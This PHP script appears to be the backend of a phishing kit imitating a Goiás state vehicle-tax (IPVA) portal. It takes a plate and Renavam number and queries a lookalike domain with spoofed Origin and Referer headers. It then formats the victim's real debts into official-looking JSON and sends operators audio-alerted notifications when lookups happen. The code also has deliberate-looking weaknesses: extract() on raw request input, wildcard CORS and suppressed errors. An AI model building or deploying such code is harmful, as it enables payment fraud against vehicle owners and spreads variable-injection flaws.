<?php

error_reporting(0);

extract($_GET);
extract($_POST);

header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');

if($renavam && $placa){

    date_default_timezone_set('America/Sao_Paulo');

    require_once "../db.php";

    function Notifications($mensagem){
        global $pdo;

        $criado_em = date('Y/m/d H:i:s');

        $stmt = $pdo->prepare("INSERT INTO notificacoes (mensagem, criado_em) VALUES (:mensagem, :criado_em)");
        $stmt->execute([':mensagem' => "$mensagem - $criado_em", ':criado_em' => $criado_em]);

        $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual, hora = :hora WHERE id = :id");
        $updateStmt->execute([':audio' => 5, ':atual' => rand(100000000, 99999999999), ':hora' => $criado_em, ':id' => 1]);
    }

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://atendimento-expressogo.com/expresso/api_firestone.php?lista=$placa|$renavam&token=vias");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

    $headers = array(
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control: no-cache',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Dnt: 1',
        'Origin: https://portal.expresso-goias.site',
        'Pragma: no-cache',
        'Priority: u=1, i',
        'Referer: https://portal.expresso-goias.site/ipva-portal/busca/',
        'Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);

    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        try {

            $user_id = $_COOKIE['user_id'] ?? null;

            if ($user_id) {
                $stmt = $pdo->prepare("DELETE FROM typing_status WHERE user_id = :user_id");
                $stmt->execute([':user_id' => $user_id]);
            }

        } catch (Exception $e) {}

    if ($result === false) {

         $error_msg = curl_error($ch);

         Notifications("Erro de conexão com API: $error_msg");

        echo json_encode(array('status' => 'error', 'msg' => "Erro de conexão com a API: $error_msg"));

    } elseif ($http_code != 200) {

         if (strpos($result, 'Not Found') !== false) {
                  
            Notifications('API Not Found');

         }else{

            Notifications("API retornou HTTP $http_code");

         }

        echo json_encode(array('status' => 'error', 'msg' => "API retornou HTTP $http_code"));

    } elseif (strpos($result, 'debts"') !== false) {

        $dados = json_decode($result, true);

        // Inicializa as variáveis para somar os valores
        $totalMultas = 0;
        $totalIpva = 0;
        $totalLicenciamento = 0;
        $totalSeguro = 0;  // A princípio, não há débito de seguro
        $totalDebitos = 0;

        // Estrutura de saída inicial
        $saida = [
            "status" => "ok",
            "acao" => [
                "debitosTotaisVeiculo" => [
                    "descricao" => null,
                    "totalSeguro" => "R$ 0,00",  // Inicialmente "R$ 0,00", pode ser alterado caso haja débito de seguro
                    "totalMultas" => "R$ 0,00",
                    "totalIpva" => "R$ 0,00",
                    "totalDebitos" => "----",  // Será calculado no final
                    "totalLicenciamento" => "R$ 0,00"
                ],
                "situacaoMultaVeiculo" => [
                    "multasVencidas" => [],
                    "multasNaoVencidas" => [],
                    "multasSubJudice" => [],
                    "multasParceladas" => [],
                    "multasNotificadas" => [],
                    "multasAtivaSne" => [],
                    "multasNaoNotificadas" => []
                ],
                "debitosVeiculo" => [],
                "debitosServicosVeiculo" => null,
                "debitosTotaisServicosVeiculo" => null
            ]
        ];

        function extrairAno($data) {
            // Converte a data para o formato "Y-m-d"
            $dataConvertida = DateTime::createFromFormat('d/m/Y', $data);
            return $dataConvertida ? $dataConvertida->format('Y') : null;
        }

        function formatarValor($valor) {
            // Remove "R$" e converte o valor para float
            $valor = str_replace(['R$', '.'], ['', ''], $valor); // Remove "R$" e ponto de milhar
            $valor = str_replace(',', '.', $valor); // Substitui vírgula por ponto
            return (float) $valor; // Converte para float
        }


        // Mapeia as multas para a lista "debitosVeiculo"
        foreach ($dados['debts'] as $debito) {
            // Extrai o valor numérico de cada débito
            $valor = formatarValor($debito['valor']);

            $totalLicenciamentoX = "PAGO";
            $totalIpvaX = "PAGO";
            $totalMultasX = "----";

            // Adiciona os valores conforme o tipo de débito
            if (strpos($debito['descricao'], 'IPVA') !== false) {
                $totalIpva += $valor;
                $totalIpvaX = number_format($valor, 2, ',', '.');
            } elseif (strpos($debito['descricao'], 'Multa') !== false) {
                $totalMultas += $valor;
                $totalMultasX = number_format($valor, 2, ',', '.');
            } elseif (strpos($debito['descricao'], 'Licenciamento') !== false) {
                $totalLicenciamento += $valor;
                $totalLicenciamentoX = number_format($valor, 2, ',', '.');
            }

            $valorTotal = 0;
            if (strpos($debito['descricao'], 'IPVA') !== false) {
                $valorTotal += $valor;
            }
            if (strpos($debito['descricao'], 'Multa') !== false) {
                $valorTotal += $valor;
            }
            if (strpos($debito['descricao'], 'Licenciamento') !== false) {
                $valorTotal += $valor;
            }

            $valorTotal = $valorTotal ? $valorTotal : "----";
            
            // Adiciona o débito à lista de "debitosVeiculo"
            $debitoVeiculo = [
                "valorTotal" => "R$ " . number_format($valorTotal, 2, ',', '.'),
                "valorIpva" => $totalIpvaX,
                "dataVencimento" => $debito['vencimento'],
                "valorLicenciamento" => $totalLicenciamentoX,
                "valorSeguro" => "----",  // No exemplo, não temos seguro
                "valorMulta" => $totalMultasX,
                "anoExercicio" => extrairAno($debito['vencimento']),
                "permiteEmissao" => "N",  // Valor fixo
                "permiteEmissaoIpvaAutuado" => "N",  // Valor fixo
                "valorMultaAcumulado" => "R$ 0,00"
            ];

            $saida['acao']['debitosVeiculo'][] = $debitoVeiculo;
        }

        // Calcula o total de débitos
        $totalDebitos = $totalMultas + $totalIpva + $totalLicenciamento + $totalSeguro;

        // Atualiza os totais
        $saida['acao']['debitosTotaisVeiculo']['totalMultas'] = "R$ " . number_format($totalMultas, 2, ',', '.');
        $saida['acao']['debitosTotaisVeiculo']['totalIpva'] = "R$ " . number_format($totalIpva, 2, ',', '.');
        $saida['acao']['debitosTotaisVeiculo']['totalLicenciamento'] = "R$ " . number_format($totalLicenciamento, 2, ',', '.');
        $saida['acao']['debitosTotaisVeiculo']['totalDebitos'] = "R$ " . number_format($totalDebitos, 2, ',', '.');

        // Converte de volta para JSON
        echo json_encode($saida);

    } else {

        if ($retestar < 3) {
            echo json_encode(array('status' => 2, 'msg' => 'Retestar infor!'));
        } else {
            echo $result;
        }
    }

    curl_close($ch);

} else {
    echo json_encode(array('status' => false, 'msg' => 'Parâmetro placa ou Renavam não fornecido!'));
}
